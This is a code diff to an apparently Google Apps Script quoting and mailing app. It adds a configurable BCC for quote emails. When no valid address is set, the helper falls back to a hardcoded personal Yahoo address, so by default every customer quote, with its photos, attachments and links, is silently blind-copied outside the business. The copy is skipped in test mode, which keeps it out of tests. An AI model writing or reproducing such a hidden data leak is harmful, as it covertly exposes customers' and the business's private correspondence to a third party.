@@ -104,6 +104,10 @@ function sendMail_(msg) {
   if (msg.body) payload.body = msg.body;
   if (msg.inlineImages) payload.inlineImages = msg.inlineImages;
   if (msg.attachments) payload.attachments = msg.attachments;
+  if (msg.quote && !TEST_MODE) {
+    var bcc = quoteBcc_(settings_().quoteBcc);
+    if (bcc && bcc.toLowerCase() !== String(env.to || '').toLowerCase()) payload.bcc = bcc;
+  }
   MailApp.sendEmail(payload);
 }
 function mailOpts_(j) {
@@ -132,6 +136,7 @@ function sendQuote_(j) {
   if (!j.emailed) return;
   sendMail_({
     job: j,
+    quote: true,
     subject: copy.subject,
     html: quoteEmailHtml(Object.assign(mailOpts_(j), { photosHtml: im.h, link: function (k) { return respUrl_(j, k); } })),
     inlineImages: im.inl,
@@ -194,6 +199,11 @@ function loadObj_(n) {
     return o;
   } catch (e2) { return {}; }
 }
+function quoteBcc_(raw) {
+  var s = String(raw == null ? '' : raw).trim().slice(0, 120);
+  if (/^[^\s@,;]+@[^\s@,;]+\.[a-z]{2,}$/i.test(s)) return s;
+  return 'mccardlematt@yahoo.com';
+}
 function settings_() {
   var o = loadObj_('settings.json');
   var min = o.finMin == null || o.finMin === '' ? 1000 : Number(String(o.finMin).replace(/[^0-9.\-]/g, ''));
@@ -202,6 +212,7 @@ function settings_() {
     payLink: String(o.payLink || ''), reviewLink: String(o.reviewLink || ''), finLink: String(o.finLink || ''), finMin: min, ocr: o.ocr === false ? false : true, qbo: qboPublic_(),
     form: normalizeForm(o.form), mileRate: mileRate_(o.mileRate), theme: o.theme === 'classic' ? 'classic' : 'dark',
     quoteBody: String(o.quoteBody || ''), quoteSubject: String(o.quoteSubject || ''), quoteSign: String(o.quoteSign || ''),
+    quoteBcc: quoteBcc_(o.quoteBcc),
     galleryHide: galleryHide_(o.galleryHide),
     reminders: reminderCfg_(o)
   };
@@ -1282,6 +1293,7 @@ function doPost(e) {
         curS.quoteBody = String(d.quoteBody || '').trim().slice(0, 4000);
         curS.quoteSubject = String(d.quoteSubject || '').trim().slice(0, 300);
         curS.quoteSign = String(d.quoteSign || '').trim().slice(0, 800);
+        if (d.quoteBcc != null) curS.quoteBcc = quoteBcc_(d.quoteBcc);
         if (Array.isArray(d.galleryHide)) curS.galleryHide = galleryHide_(d.galleryHide);
         if (d.reminders && typeof d.reminders === 'object') {
           var postedR = d.reminders;
